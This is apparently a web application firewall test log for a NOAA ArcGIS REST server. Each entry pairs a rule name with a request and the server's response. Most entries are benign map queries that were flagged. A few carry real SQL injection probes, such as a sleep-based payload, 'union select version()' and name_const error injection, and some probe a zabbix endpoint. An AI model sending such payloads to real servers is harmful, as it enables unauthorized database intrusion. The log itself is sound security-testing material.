+{"displayFieldName":"gaugelid","fieldAliases":{"objectid":"objectid","gaugelid":"gaugelid","status":"status","location":"location","latitude":"latitude","longitude":"longitude","waterbody":"waterbody","state":"state","obstime":"obstime","units":"units","lowthreshu":"lowthreshu","wfo":"wfo","hdatum":"hdatum","pedts":"pedts","secunit":"secunit","url":"url","idp_source":"idp_source","idp_subset":"idp_subset","observed":"observed","action":"action","forecast":"forecast","lowthresh":"lowthresh","secvalue":"secvalue","flood":"flood","moderate":"moderate","major":"major","idp_filedate":"idp_filedate","idp_ingestdate":"idp_ingestdate","idp_current_forecast":"idp_current_forecast","idp_time_series":"idp_time_series","idp_issueddate":"idp_issueddate","idp_validtime":"idp_validtime","idp_validendtime":"idp_validendtime","idp_fcst_hour":"idp_fcst_hour"},"geometryType":"esriGeometryPoint","spatialReference":{"wkid":102100,"latestWkid":3857},"fields":[{"name":"objectid","type":"esriFieldTypeOID","alias":"objectid"},{"name":"gaugelid","type":"esriFieldTypeString","alias":"gaugelid","length":5},{"name":"status","type":"esriFieldTypeString","alias":"status","length":25},{"name":"location","type":"esriFieldTypeString","alias":"location","length":90},{"name":"latitude","type":"esriFieldTypeDouble","alias":"latitude"},{"name":"longitude","type":"esriFieldTypeDouble","alias":"longitude"},{"name":"waterbody","type":"esriFieldTypeString","alias":"waterbody","length":255},{"name":"state","type":"esriFieldTypeString","alias":"state","length":2},{"name":"obstime","type":"esriFieldTypeString","alias":"obstime","length":26},{"name":"units","type":"esriFieldTypeString","alias":"units","length":5},{"name":"lowthreshu","type":"esriFieldTypeString","alias":"lowthreshu","length":5},{"name":"wfo","type":"esriFieldTypeString","alias":"wfo","length":5},{"name":"hdatum","type":"esriFieldTypeString","alias":"hdatum","length":30},{"name":"pedts","type":"esriFieldTypeString","alias":"pedts","length":5},{"name":"secunit","type":"esriFieldTypeString","alias":"secunit","length":5},{"name":"url","type":"esriFieldTypeString","alias":"url","length":231},{"name":"idp_source","type":"esriFieldTypeString","alias":"idp_source","length":50},{"name":"idp_subset","type":"esriFieldTypeString","alias":"idp_subset","length":50},{"name":"observed","type":"esriFieldTypeString","alias":"observed","length":24},{"name":"action","type":"esriFieldTypeString","alias":"action","length":24},{"name":"forecast","type":"esriFieldTypeString","alias":"forecast","length":24},{"name":"lowthresh","type":"esriFieldTypeString","alias":"lowthresh","length":24},{"name":"secvalue","type":"esriFieldTypeString","alias":"secvalue","length":24},{"name":"flood","type":"esriFieldTypeString","alias":"flood","length":24},{"name":"moderate","type":"esriFieldTypeString","alias":"moderate","length":24},{"name":"major","type":"esriFieldTypeString","alias":"major","length":24},{"name":"idp_filedate","type":"esriFieldTypeDate","alias":"idp_filedate","length":8},{"name":"idp_ingestdate","type":"esriFieldTypeDate","alias":"idp_ingestdate","length":8},{"name":"idp_current_forecast","type":"esriFieldTypeInteger","alias":"idp_current_forecast"},{"name":"idp_time_series","type":"esriFieldTypeInteger","alias":"idp_time_series"},{"name":"idp_issueddate","type":"esriFieldTypeDate","alias":"idp_issueddate","length":8},{"name":"idp_validtime","type":"esriFieldTypeDate","alias":"idp_validtime","length":8},{"name":"idp_validendtime","type":"esriFieldTypeDate","alias":"idp_validendtime","length":8},{"name":"idp_fcst_hour","type":"esriFieldTypeInteger","alias":"idp_fcst_hour"}],"features":[]}
+
+959073 SQL Injection Attack
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NOAA/MPA_Inventory/MapServer/0/query?f=json&where=UPPER(Site_Name)%20LIKE%20%27%25GA%25%27&returnGeometry=false&spatialRel=esriSpatialRelIntersects&outFields=Site_Name%2COBJECTID_1&outSR=102100&resultRecordCount=6
+{"displayFieldName":"Site_Name","fieldAliases":{"Site_Name":"Site Name","OBJECTID_1":"OBJECTID_1"},"fields":[{"name":"Site_Name","type":"esriFieldTypeString","alias":"Site Name","length":254},{"name":"OBJECTID_1","type":"esriFieldTypeOID","alias":"OBJECTID_1"}],"features":[{"attributes":{"Site_Name":"Walrus Islands State Game Sanctuary","OBJECTID_1":7}},{"attributes":{"Site_Name":"Pattagansett River Marsh Wildlife Area","OBJECTID_1":37}},{"attributes":{"Site_Name":"Alligator Harbor Aquatic Preserve","OBJECTID_1":57}},{"attributes":{"Site_Name":"Dry Tortugas National Park Outstanding Florida Water","OBJECTID_1":90}},{"attributes":{"Site_Name":"Fred Gannon Rocky Bayou State Recreation Area Outstanding Florida Water","OBJECTID_1":101}},{"attributes":{"Site_Name":"Gasparilla Island State Park Outstanding Florida Water","OBJECTID_1":102}}],"exceededTransferLimit":true}
+
+981173 Restricted SQL Character Anomaly Detection Alert - Total # of special characters exceeded
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Observations/ahps_riv_gauges/MapServer/identify?geometry=%7B%22x%22%3A-9391894.380904486%2C%22y%22%3A4691708.326328477%7D&mapExtent=-9393316.826227613%2C4690924.84678862%2C-9391023.71537925%2C4692183.669098086&returnGeometry=true&f=json&geometryType=esriGeometryPoint&tolerance=3&sr=102100&imageDisplay=1920%2C1054%2C96&_ts=1519684440247&layers=all%3A0&layerDefs=%7B%220%22%3A%22status%20%3D%20'-1'%20OR%20status%20%3D%20'minor'%20OR%20status%20%3D%20'moderate'%20OR%20status%20%3D%20'major'%22%7D
+{"results":[]}
+
+981318 SQL Injection Attack: Common Injection Testing Detected
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Observations/ahps_riv_gauges/MapServer/0/query?f=json&where=gaugelid%20%3D%20%27LNSM4%27%20OR%20gaugelid%20%3D%20%27ELNM4%27%20OR%20gaugelid%20%3D%20%27HHTM4%27%20OR%20gaugelid%20%3D%20%27DMDM4%27%20OR%20gaugelid%20%3D%20%27GLDM4%27&returnGeometry=true&spatialRel=esriSpatialRelIntersects&geometry=%7B%22xmin%22%3A-9431717.794177745%2C%22ymin%22%3A5273543.455469495%2C%22xmax%22%3A-9421933.854557255%2C%22ymax%22%3A5283327.395089984%2C%22spatialReference%22%3A%7B%22wkid%22%3A102100%2C%22latestWkid%22%3A3857%7D%7D&geometryType=esriGeometryEnvelope&inSR=102100&outFields=*&outSR=102100
+{"displayFieldName":"gaugelid","fieldAliases":{"objectid":"objectid","gaugelid":"gaugelid","status":"status","location":"location","latitude":"latitude","longitude":"longitude","waterbody":"waterbody","state":"state","obstime":"obstime","units":"units","lowthreshu":"lowthreshu","wfo":"wfo","hdatum":"hdatum","pedts":"pedts","secunit":"secunit","url":"url","idp_source":"idp_source","idp_subset":"idp_subset","observed":"observed","action":"action","forecast":"forecast","lowthresh":"lowthresh","secvalue":"secvalue","flood":"flood","moderate":"moderate","major":"major","idp_filedate":"idp_filedate","idp_ingestdate":"idp_ingestdate","idp_current_forecast":"idp_current_forecast","idp_time_series":"idp_time_series","idp_issueddate":"idp_issueddate","idp_validtime":"idp_validtime","idp_validendtime":"idp_validendtime","idp_fcst_hour":"idp_fcst_hour"},"geometryType":"esriGeometryPoint","spatialReference":{"wkid":102100,"latestWkid":3857},"fields":[{"name":"objectid","type":"esriFieldTypeOID","alias":"objectid"},{"name":"gaugelid","type":"esriFieldTypeString","alias":"gaugelid","length":5},{"name":"status","type":"esriFieldTypeString","alias":"status","length":25},{"name":"location","type":"esriFieldTypeString","alias":"location","length":90},{"name":"latitude","type":"esriFieldTypeDouble","alias":"latitude"},{"name":"longitude","type":"esriFieldTypeDouble","alias":"longitude"},{"name":"waterbody","type":"esriFieldTypeString","alias":"waterbody","length":255},{"name":"state","type":"esriFieldTypeString","alias":"state","length":2},{"name":"obstime","type":"esriFieldTypeString","alias":"obstime","length":26},{"name":"units","type":"esriFieldTypeString","alias":"units","length":5},{"name":"lowthreshu","type":"esriFieldTypeString","alias":"lowthreshu","length":5},{"name":"wfo","type":"esriFieldTypeString","alias":"wfo","length":5},{"name":"hdatum","type":"esriFieldTypeString","alias":"hdatum","length":30},{"name":"pedts","type":"esriFieldTypeString","alias":"pedts","length":5},{"name":"secunit","type":"esriFieldTypeString","alias":"secunit","length":5},{"name":"url","type":"esriFieldTypeString","alias":"url","length":231},{"name":"idp_source","type":"esriFieldTypeString","alias":"idp_source","length":50},{"name":"idp_subset","type":"esriFieldTypeString","alias":"idp_subset","length":50},{"name":"observed","type":"esriFieldTypeString","alias":"observed","length":24},{"name":"action","type":"esriFieldTypeString","alias":"action","length":24},{"name":"forecast","type":"esriFieldTypeString","alias":"forecast","length":24},{"name":"lowthresh","type":"esriFieldTypeString","alias":"lowthresh","length":24},{"name":"secvalue","type":"esriFieldTypeString","alias":"secvalue","length":24},{"name":"flood","type":"esriFieldTypeString","alias":"flood","length":24},{"name":"moderate","type":"esriFieldTypeString","alias":"moderate","length":24},{"name":"major","type":"esriFieldTypeString","alias":"major","length":24},{"name":"idp_filedate","type":"esriFieldTypeDate","alias":"idp_filedate","length":8},{"name":"idp_ingestdate","type":"esriFieldTypeDate","alias":"idp_ingestdate","length":8},{"name":"idp_current_forecast","type":"esriFieldTypeInteger","alias":"idp_current_forecast"},{"name":"idp_time_series","type":"esriFieldTypeInteger","alias":"idp_time_series"},{"name":"idp_issueddate","type":"esriFieldTypeDate","alias":"idp_issueddate","length":8},{"name":"idp_validtime","type":"esriFieldTypeDate","alias":"idp_validtime","length":8},{"name":"idp_validendtime","type":"esriFieldTypeDate","alias":"idp_validendtime","length":8},{"name":"idp_fcst_hour","type":"esriFieldTypeInteger","alias":"idp_fcst_hour"}],"features":[]}
+
+981245 Basic SQL Authentication Bypass Attempts 2/3
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NOS_Biogeo_Biomapper/NER_Dynamic/MapServer/3/query?f=json&where=lower(Video_ID)%20like%20%27%25aa_71%25%27&returnGeometry=true&spatialRel=esriSpatialRelIntersects&outFields=*
+{"displayFieldName":"Comments","fieldAliases":{"OBJECTID":"OBJECTID","Site_ID":"Site ID","Comments":"Comments","Date":"Date","Time":"Time","Video_ID":"Video ID","M_STRUCT":"Major Structure","D_STRUCT":"Detailed Structure","P_HARD":"% Hardbottom","T_COMPLEX":"Topographic Complexity","M_COVER":"Major Biological Cover","P_COVER":"% Major Biological Cover","CO_COVER":"Co-occurring Cpver","P_CORAL":"% Live Coral Cover","D_CORAL":"Dominant Coral Type","ACROPORA":"Acropora","MEGAFAUNA":"Megafauna","VISIBILITY":"Visibility","ASSESSMENT":"Assessment","Photo_ID":"Photo ID","SURVEY":"SURVEY","VideoExists":"VideoExists","PhotoCount":"PhotoCount"},"geometryType":"esriGeometryPoint","spatialReference":{"wkid":102100,"latestWkid":3857},"fields":[{"name":"OBJECTID","type":"esriFieldTypeOID","alias":"OBJECTID"},{"name":"Site_ID","type":"esriFieldTypeInteger","alias":"Site ID"},{"name":"Comments","type":"esriFieldTypeString","alias":"Comments","length":100},{"name":"Date","type":"esriFieldTypeDate","alias":"Date","length":8},{"name":"Time","type":"esriFieldTypeString","alias":"Time","length":10},{"name":"Video_ID","type":"esriFieldTypeString","alias":"Video ID","length":25},{"name":"M_STRUCT","type":"esriFieldTypeString","alias":"Major Structure","length":254},{"name":"D_STRUCT","type":"esriFieldTypeString","alias":"Detailed Structure","length":254},{"name":"P_HARD","type":"esriFieldTypeString","alias":"% Hardbottom","length":254},{"name":"T_COMPLEX","type":"esriFieldTypeString","alias":"Topographic Complexity","length":254},{"name":"M_COVER","type":"esriFieldTypeString","alias":"Major Biological Cover","length":254},{"name":"P_COVER","type":"esriFieldTypeString","alias":"% Major Biological Cover","length":254},{"name":"CO_COVER","type":"esriFieldTypeString","alias":"Co-occurring Cpver","length":254},{"name":"P_CORAL","type":"esriFieldTypeString","alias":"% Live Coral Cover","length":254},{"name":"D_CORAL","type":"esriFieldTypeString","alias":"Dominant Coral Type","length":254},{"name":"ACROPORA","type":"esriFieldTypeString","alias":"Acropora","length":254},{"name":"MEGAFAUNA","type":"esriFieldTypeString","alias":"Megafauna","length":254},{"name":"VISIBILITY","type":"esriFieldTypeString","alias":"Visibility","length":254},{"name":"ASSESSMENT","type":"esriFieldTypeString","alias":"Assessment","length":254},{"name":"Photo_ID","type":"esriFieldTypeString","alias":"Photo ID","length":10},{"name":"SURVEY","type":"esriFieldTypeString","alias":"SURVEY","length":10},{"name":"VideoExists","type":"esriFieldTypeString","alias":"VideoExists","length":5},{"name":"PhotoCount","type":"esriFieldTypeSmallInteger","alias":"PhotoCount"}],"features":[{"attributes":{"OBJECTID":2856,"Site_ID":71,"Comments":" ","Date":1410825600000,"Time":"11:58:00am","Video_ID":"AA_71","M_STRUCT":"Coral Reef and Hardbottom","D_STRUCT":"Aggregate Reef","P_HARD":"90% - 100%","T_COMPLEX":"High","M_COVER":"Algae","P_COVER":"Continuous (90% - 100%)","CO_COVER":"Live Coral","P_CORAL":"10% - \u003c50%","D_CORAL":"Mixed Hard/Soft","ACROPORA":"AcrPal","MEGAFAUNA":"No Observation","VISIBILITY":"High","ASSESSMENT":"Snorkel","Photo_ID":" ","SURVEY":"AA_0914","VideoExists":"Yes","PhotoCount":0},"geometry":{"x":-7271862.5263999961,"y":2077461.6941000037}}]}
+
+981248 Chained SQL Injection Attempts 1/2
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Observations/ahps_riv_gauges/MapServer/0/query?f=json&where=gaugelid%20%3D%20%27LNSM4%27%20OR%20gaugelid%20%3D%20%27ELNM4%27%20OR%20gaugelid%20%3D%20%27HHTM4%27%20OR%20gaugelid%20%3D%20%27DMDM4%27%20OR%20gaugelid%20%3D%20%27GLDM4%27&returnGeometry=true&spatialRel=esriSpatialRelIntersects&geometry=%7B%22xmin%22%3A-9431717.794177745%2C%22ymin%22%3A5273543.455469495%2C%22xmax%22%3A-9421933.854557255%2C%22ymax%22%3A5283327.395089984%2C%22spatialReference%22%3A%7B%22wkid%22%3A102100%2C%22latestWkid%22%3A3857%7D%7D&geometryType=esriGeometryEnvelope&inSR=102100&outFields=*&outSR=102100
+{"displayFieldName":"gaugelid","fieldAliases":{"objectid":"objectid","gaugelid":"gaugelid","status":"status","location":"location","latitude":"latitude","longitude":"longitude","waterbody":"waterbody","state":"state","obstime":"obstime","units":"units","lowthreshu":"lowthreshu","wfo":"wfo","hdatum":"hdatum","pedts":"pedts","secunit":"secunit","url":"url","idp_source":"idp_source","idp_subset":"idp_subset","observed":"observed","action":"action","forecast":"forecast","lowthresh":"lowthresh","secvalue":"secvalue","flood":"flood","moderate":"moderate","major":"major","idp_filedate":"idp_filedate","idp_ingestdate":"idp_ingestdate","idp_current_forecast":"idp_current_forecast","idp_time_series":"idp_time_series","idp_issueddate":"idp_issueddate","idp_validtime":"idp_validtime","idp_validendtime":"idp_validendtime","idp_fcst_hour":"idp_fcst_hour"},"geometryType":"esriGeometryPoint","spatialReference":{"wkid":102100,"latestWkid":3857},"fields":[{"name":"objectid","type":"esriFieldTypeOID","alias":"objectid"},{"name":"gaugelid","type":"esriFieldTypeString","alias":"gaugelid","length":5},{"name":"status","type":"esriFieldTypeString","alias":"status","length":25},{"name":"location","type":"esriFieldTypeString","alias":"location","length":90},{"name":"latitude","type":"esriFieldTypeDouble","alias":"latitude"},{"name":"longitude","type":"esriFieldTypeDouble","alias":"longitude"},{"name":"waterbody","type":"esriFieldTypeString","alias":"waterbody","length":255},{"name":"state","type":"esriFieldTypeString","alias":"state","length":2},{"name":"obstime","type":"esriFieldTypeString","alias":"obstime","length":26},{"name":"units","type":"esriFieldTypeString","alias":"units","length":5},{"name":"lowthreshu","type":"esriFieldTypeString","alias":"lowthreshu","length":5},{"name":"wfo","type":"esriFieldTypeString","alias":"wfo","length":5},{"name":"hdatum","type":"esriFieldTypeString","alias":"hdatum","length":30},{"name":"pedts","type":"esriFieldTypeString","alias":"pedts","length":5},{"name":"secunit","type":"esriFieldTypeString","alias":"secunit","length":5},{"name":"url","type":"esriFieldTypeString","alias":"url","length":231},{"name":"idp_source","type":"esriFieldTypeString","alias":"idp_source","length":50},{"name":"idp_subset","type":"esriFieldTypeString","alias":"idp_subset","length":50},{"name":"observed","type":"esriFieldTypeString","alias":"observed","length":24},{"name":"action","type":"esriFieldTypeString","alias":"action","length":24},{"name":"forecast","type":"esriFieldTypeString","alias":"forecast","length":24},{"name":"lowthresh","type":"esriFieldTypeString","alias":"lowthresh","length":24},{"name":"secvalue","type":"esriFieldTypeString","alias":"secvalue","length":24},{"name":"flood","type":"esriFieldTypeString","alias":"flood","length":24},{"name":"moderate","type":"esriFieldTypeString","alias":"moderate","length":24},{"name":"major","type":"esriFieldTypeString","alias":"major","length":24},{"name":"idp_filedate","type":"esriFieldTypeDate","alias":"idp_filedate","length":8},{"name":"idp_ingestdate","type":"esriFieldTypeDate","alias":"idp_ingestdate","length":8},{"name":"idp_current_forecast","type":"esriFieldTypeInteger","alias":"idp_current_forecast"},{"name":"idp_time_series","type":"esriFieldTypeInteger","alias":"idp_time_series"},{"name":"idp_issueddate","type":"esriFieldTypeDate","alias":"idp_issueddate","length":8},{"name":"idp_validtime","type":"esriFieldTypeDate","alias":"idp_validtime","length":8},{"name":"idp_validendtime","type":"esriFieldTypeDate","alias":"idp_validendtime","length":8},{"name":"idp_fcst_hour","type":"esriFieldTypeInteger","alias":"idp_fcst_hour"}],"features":[]}
+
+950001 SQL Injection attack
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NOAA/MPA_Inventory/MapServer/0/query?f=json&where=UPPER(Site_Name)%20LIKE%20%27%25GA%25%27&returnGeometry=false&spatialRel=esriSpatialRelIntersects&outFields=Site_Name%2COBJECTID_1&outSR=102100&resultRecordCount=6
+{"displayFieldName":"Site_Name","fieldAliases":{"Site_Name":"Site Name","OBJECTID_1":"OBJECTID_1"},"fields":[{"name":"Site_Name","type":"esriFieldTypeString","alias":"Site Name","length":254},{"name":"OBJECTID_1","type":"esriFieldTypeOID","alias":"OBJECTID_1"}],"features":[{"attributes":{"Site_Name":"Walrus Islands State Game Sanctuary","OBJECTID_1":7}},{"attributes":{"Site_Name":"Pattagansett River Marsh Wildlife Area","OBJECTID_1":37}},{"attributes":{"Site_Name":"Alligator Harbor Aquatic Preserve","OBJECTID_1":57}},{"attributes":{"Site_Name":"Dry Tortugas National Park Outstanding Florida Water","OBJECTID_1":90}},{"attributes":{"Site_Name":"Fred Gannon Rocky Bayou State Recreation Area Outstanding Florida Water","OBJECTID_1":101}},{"attributes":{"Site_Name":"Gasparilla Island State Park Outstanding Florida Water","OBJECTID_1":102}}],"exceededTransferLimit":true}
+
+981243 Classic SQL Injection Probes 2/2
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Observations/ahps_riv_gauges/MapServer/0/query?f=json&where=gaugelid%20%3D%20%27LNSM4%27%20OR%20gaugelid%20%3D%20%27ELNM4%27%20OR%20gaugelid%20%3D%20%27HHTM4%27%20OR%20gaugelid%20%3D%20%27DMDM4%27%20OR%20gaugelid%20%3D%20%27GLDM4%27&returnGeometry=true&spatialRel=esriSpatialRelIntersects&geometry=%7B%22xmin%22%3A-9431717.794177745%2C%22ymin%22%3A5273543.455469495%2C%22xmax%22%3A-9421933.854557255%2C%22ymax%22%3A5283327.395089984%2C%22spatialReference%22%3A%7B%22wkid%22%3A102100%2C%22latestWkid%22%3A3857%7D%7D&geometryType=esriGeometryEnvelope&inSR=102100&outFields=*&outSR=102100
+{"displayFieldName":"gaugelid","fieldAliases":{"objectid":"objectid","gaugelid":"gaugelid","status":"status","location":"location","latitude":"latitude","longitude":"longitude","waterbody":"waterbody","state":"state","obstime":"obstime","units":"units","lowthreshu":"lowthreshu","wfo":"wfo","hdatum":"hdatum","pedts":"pedts","secunit":"secunit","url":"url","idp_source":"idp_source","idp_subset":"idp_subset","observed":"observed","action":"action","forecast":"forecast","lowthresh":"lowthresh","secvalue":"secvalue","flood":"flood","moderate":"moderate","major":"major","idp_filedate":"idp_filedate","idp_ingestdate":"idp_ingestdate","idp_current_forecast":"idp_current_forecast","idp_time_series":"idp_time_series","idp_issueddate":"idp_issueddate","idp_validtime":"idp_validtime","idp_validendtime":"idp_validendtime","idp_fcst_hour":"idp_fcst_hour"},"geometryType":"esriGeometryPoint","spatialReference":{"wkid":102100,"latestWkid":3857},"fields":[{"name":"objectid","type":"esriFieldTypeOID","alias":"objectid"},{"name":"gaugelid","type":"esriFieldTypeString","alias":"gaugelid","length":5},{"name":"status","type":"esriFieldTypeString","alias":"status","length":25},{"name":"location","type":"esriFieldTypeString","alias":"location","length":90},{"name":"latitude","type":"esriFieldTypeDouble","alias":"latitude"},{"name":"longitude","type":"esriFieldTypeDouble","alias":"longitude"},{"name":"waterbody","type":"esriFieldTypeString","alias":"waterbody","length":255},{"name":"state","type":"esriFieldTypeString","alias":"state","length":2},{"name":"obstime","type":"esriFieldTypeString","alias":"obstime","length":26},{"name":"units","type":"esriFieldTypeString","alias":"units","length":5},{"name":"lowthreshu","type":"esriFieldTypeString","alias":"lowthreshu","length":5},{"name":"wfo","type":"esriFieldTypeString","alias":"wfo","length":5},{"name":"hdatum","type":"esriFieldTypeString","alias":"hdatum","length":30},{"name":"pedts","type":"esriFieldTypeString","alias":"pedts","length":5},{"name":"secunit","type":"esriFieldTypeString","alias":"secunit","length":5},{"name":"url","type":"esriFieldTypeString","alias":"url","length":231},{"name":"idp_source","type":"esriFieldTypeString","alias":"idp_source","length":50},{"name":"idp_subset","type":"esriFieldTypeString","alias":"idp_subset","length":50},{"name":"observed","type":"esriFieldTypeString","alias":"observed","length":24},{"name":"action","type":"esriFieldTypeString","alias":"action","length":24},{"name":"forecast","type":"esriFieldTypeString","alias":"forecast","length":24},{"name":"lowthresh","type":"esriFieldTypeString","alias":"lowthresh","length":24},{"name":"secvalue","type":"esriFieldTypeString","alias":"secvalue","length":24},{"name":"flood","type":"esriFieldTypeString","alias":"flood","length":24},{"name":"moderate","type":"esriFieldTypeString","alias":"moderate","length":24},{"name":"major","type":"esriFieldTypeString","alias":"major","length":24},{"name":"idp_filedate","type":"esriFieldTypeDate","alias":"idp_filedate","length":8},{"name":"idp_ingestdate","type":"esriFieldTypeDate","alias":"idp_ingestdate","length":8},{"name":"idp_current_forecast","type":"esriFieldTypeInteger","alias":"idp_current_forecast"},{"name":"idp_time_series","type":"esriFieldTypeInteger","alias":"idp_time_series"},{"name":"idp_issueddate","type":"esriFieldTypeDate","alias":"idp_issueddate","length":8},{"name":"idp_validtime","type":"esriFieldTypeDate","alias":"idp_validtime","length":8},{"name":"idp_validendtime","type":"esriFieldTypeDate","alias":"idp_validendtime","length":8},{"name":"idp_fcst_hour","type":"esriFieldTypeInteger","alias":"idp_fcst_hour"}],"features":[]}
+
+981242 Classic SQL Injection Probes 1/2
+Status = 400
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Climate_Outlooks/cpc_wkly_sst/MapServer?f=pjson%27%26%26sLEEp%283%29%26%26%271
+
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+<title>
+Error: Output format not supported.</title>
+<link href="/arcgis/rest/static/main.css" rel="stylesheet" type="text/css"/>
+</head>
+
+<body>
+
+<table width="100%" class="userTable">
+<tr>
+<td class="titlecell">ArcGIS REST Framework</td>
+</tr>
+</table>
+<table width="100%" class="navTable">
+<tr valign="top">
+<td class="breadcrumbs">
+<a href="/arcgis/rest/services">Home</a>
+</td>
+</tr>
+</table>
+
+<div class="cbody">
+<br/>
+<br/>
+<b>Error: </b>Output format not supported.<br/>
+
+<b>Code: </b>400<br/><br/>
+
+
+
+
+
+
+
+<div style="color:#ff6666"> 
+
+</div>
+
+</div>
+
+</body>
+
+</html>
+
+
+981319 SQL Injection Attack: SQL Operator Detected
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Forecasts_Guidance_Warnings/watch_warn_adv/MapServer/1/query?f=json&returnIdsOnly=true&returnCountOnly=true&where=1%3D1%20AND%20objectid%20IN%20(673)&returnGeometry=false&spatialRel=esriSpatialRelIntersects&geometry=%7B%22xmin%22%3A-13136462.626054127%2C%22ymin%22%3A4680320.44573147%2C%22xmax%22%3A-10983995.909544136%2C%22ymax%22%3A6617540.490590462%2C%22spatialReference%22%3A%7B%22wkid%22%3A102100%7D%7D&geometryType=esriGeometryEnvelope&inSR=102100&outSR=102100
+{"count":0}
+
+981244 Basic SQL Authentication Bypass Attempts 1/3
+Status = 400
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Climate_Outlooks/cpc_wkly_sst/MapServer?f=pjson99999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x
+
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+<title>
+Error: Output format not supported.</title>
+<link href="/arcgis/rest/static/main.css" rel="stylesheet" type="text/css"/>
+</head>
+
+<body>
+
+<table width="100%" class="userTable">
+<tr>
+<td class="titlecell">ArcGIS REST Framework</td>
+</tr>
+</table>
+<table width="100%" class="navTable">
+<tr valign="top">
+<td class="breadcrumbs">
+<a href="/arcgis/rest/services">Home</a>
+</td>
+</tr>
+</table>
+
+<div class="cbody">
+<br/>
+<br/>
+<b>Error: </b>Output format not supported.<br/>
+
+<b>Code: </b>400<br/><br/>
+
+
+
+
+
+
+
+<div style="color:#ff6666"> 
+
+</div>
+
+</div>
+
+</body>
+
+</html>
+
+
+959072 SQL Injection Attack
+Status = 400
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Climate_Outlooks/cpc_wkly_sst/MapServer?f=pjson999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1
+
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+<title>
+Error: Output format not supported.</title>
+<link href="/arcgis/rest/static/main.css" rel="stylesheet" type="text/css"/>
+</head>
+
+<body>
+
+<table width="100%" class="userTable">
+<tr>
+<td class="titlecell">ArcGIS REST Framework</td>
+</tr>
+</table>
+<table width="100%" class="navTable">
+<tr valign="top">
+<td class="breadcrumbs">
+<a href="/arcgis/rest/services">Home</a>
+</td>
+</tr>
+</table>
+
+<div class="cbody">
+<br/>
+<br/>
+<b>Error: </b>Output format not supported.<br/>
+
+<b>Code: </b>400<br/><br/>
+
+
+
+
+
+
+
+<div style="color:#ff6666"> 
+
+</div>
+
+</div>
+
+</body>
+
+</html>
+
+
+981255 MSSQL Code Execution and Information Gathering Attempts
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NMFS/EFH_MapperData/MapServer/3/query?f=json&where=(TYPE%3D%27EFHA%27)%20AND%20(DDBOX%20%3D%20%27Select%20Area%20Protected%20from%20Fishing%27%20AND%20Region%20%3D%20%27PFMC%27)&returnGeometry=true&spatialRel=esriSpatialRelIntersects&outFields=LTTDT_LINK%2CLTTD_TITLE3%2CRegion%2CINSTATEWATERS&callback=dojo.io.script.jsonp_dojoIoScript8._jsonpCallback
+dojo.io.script.jsonp_dojoIoScript8._jsonpCallback({"error":{"code":400,"message":"Failed to execute query.","details":[]}});
+
+973335 IE XSS Filters - Attack Detected
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Observations/ahps_riv_gauges/MapServer/0/query?f=json&returnIdsOnly=true&returnCountOnly=true&where=(status%20%3D%20%27action%27%20OR%20status%20%3D%20%27minor%27%20OR%20status%20%3D%20%27moderate%27%20OR%20status%20%3D%20%27major%27)%20AND%20(1%3D1)&returnGeometry=false&spatialRel=esriSpatialRelIntersects&outFields=*&outSR=102100
+{"count":247}
+
+981249 Chained SQL Injection Attempts 2/2
+Status = 400
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Climate_Outlooks/cpc_wkly_sst/MapServer?f=pjson%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20and%201%3D1
+
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+<title>
+Error: Output format not supported.</title>
+<link href="/arcgis/rest/static/main.css" rel="stylesheet" type="text/css"/>
+</head>
+
+<body>
+
+<table width="100%" class="userTable">
+<tr>
+<td class="titlecell">ArcGIS REST Framework</td>
+</tr>
+</table>
+<table width="100%" class="navTable">
+<tr valign="top">
+<td class="breadcrumbs">
+<a href="/arcgis/rest/services">Home</a>
+</td>
+</tr>
+</table>
+
+<div class="cbody">
+<br/>
+<br/>
+<b>Error: </b>Output format not supported.<br/>
+
+<b>Code: </b>400<br/><br/>
+
+
+
+
+
+
+
+<div style="color:#ff6666"> 
+
+</div>
+
+</div>
+
+</body>
+
+</html>
+
+
+959070 SQL Injection Attack
+Status = 404
+https://idpgis.ncep.noaa.gov/hello
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /hello was not found on this server.</p>
+</body></html>
+
+
+981247 Concatenated Basic SQL Injection and SQLLFI Attempts
+Status = 404
+https://idpgis.ncep.noaa.gov/zabbix/jsrpc.php
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /zabbix/jsrpc.php was not found on this server.</p>
+</body></html>
+
+
+981320 SQL Injection Attack: Common DB Names Detected
+Status = 404
+https://idpgis.ncep.noaa.gov/zabbix/jsrpc.php
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /zabbix/jsrpc.php was not found on this server.</p>
+</body></html>
+
+
+981272 Blind SQLi Tests Using sleep() or benchmark()
+Status = 400
